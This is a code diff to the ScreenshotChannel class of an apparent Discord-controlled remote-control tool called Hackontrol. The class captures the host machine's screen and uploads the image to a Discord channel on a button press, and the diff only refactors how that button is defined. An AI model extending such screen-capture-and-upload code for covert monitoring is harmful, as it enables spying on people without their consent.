@@ -18,13 +18,14 @@ import com.khopan.hackontrol.utils.HackontrolButton;
 import com.khopan.hackontrol.utils.HackontrolError;
 
 import net.dv8tion.jda.api.interactions.components.ActionRow;
+import net.dv8tion.jda.api.interactions.components.buttons.Button;
 import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
 import net.dv8tion.jda.api.utils.FileUpload;
 
 public class ScreenshotChannel extends HackontrolChannel {
 	private static final String CHANNEL_NAME = "screenshot";
 
-	private static final String BUTTON_SCREENSHOT = "takeScreenshot";
+	private static final Button BUTTON_SCREENSHOT = ButtonManager.staticButton(ButtonStyle.SUCCESS, "Screenshot", "screenshot");
 
 	private final Robot robot;
 
@@ -50,7 +51,7 @@ public class ScreenshotChannel extends HackontrolChannel {
 
 	@Override
 	public void initialize() {
-		this.channel.sendMessageComponents(ActionRow.of(ButtonManager.staticButton(ButtonStyle.SUCCESS, "Screenshot", ScreenshotChannel.BUTTON_SCREENSHOT))).queue();
+		this.channel.sendMessageComponents(ActionRow.of(ScreenshotChannel.BUTTON_SCREENSHOT)).queue();
 	}
 
 	@Override
@@ -76,9 +77,7 @@ public class ScreenshotChannel extends HackontrolChannel {
 		}
 
 		byte[] byteArray = stream.toByteArray();
-		context.replyFiles(FileUpload.fromData(byteArray, ScreenshotChannel.getScreenshotFileName())).addActionRow(
-				ButtonManager.staticButton(ButtonStyle.SUCCESS, "Screenshot", ScreenshotChannel.BUTTON_SCREENSHOT),
-				HackontrolButton.delete()).queue(ButtonManager :: dynamicButtonCallback);
+		context.replyFiles(FileUpload.fromData(byteArray, ScreenshotChannel.getScreenshotFileName())).addActionRow(ScreenshotChannel.BUTTON_SCREENSHOT, HackontrolButton.delete()).queue(ButtonManager :: dynamicButtonCallback);
 	}
 
 	private static String getScreenshotFileName() {
